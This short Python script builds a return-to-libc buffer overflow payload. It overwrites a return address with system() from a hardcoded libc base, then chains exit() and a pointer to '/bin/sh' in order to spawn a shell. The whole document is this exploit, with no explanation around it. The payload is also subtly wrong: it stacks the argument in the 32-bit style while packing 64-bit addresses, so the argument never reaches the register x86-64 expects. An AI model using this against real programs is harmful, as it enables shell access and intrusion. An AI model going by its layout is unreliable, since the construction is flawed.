import struct

# Base address of libc (found earlier)
libc_base = 0x7ffff7dd3000

# Addresses
system_addr = libc_base + 0x0000000000050d70  # Address of system()
exit_addr = libc_base + 0x00000000000455f0    # Address of exit()
bin_sh_addr = libc_base + 0x197e34             # Address of "/bin/sh"

# Construct the payload
payload = b"A" * 16  # Fill buffer (adjust the number of 'A's as needed)
payload += struct.pack("<Q", system_addr)  # Overwrite return address with system()
payload += struct.pack("<Q", exit_addr)    # Address of exit()
payload += struct.pack("<Q", bin_sh_addr)  # Pointer to "/bin/sh"

# Print or send the payload
print(payload)
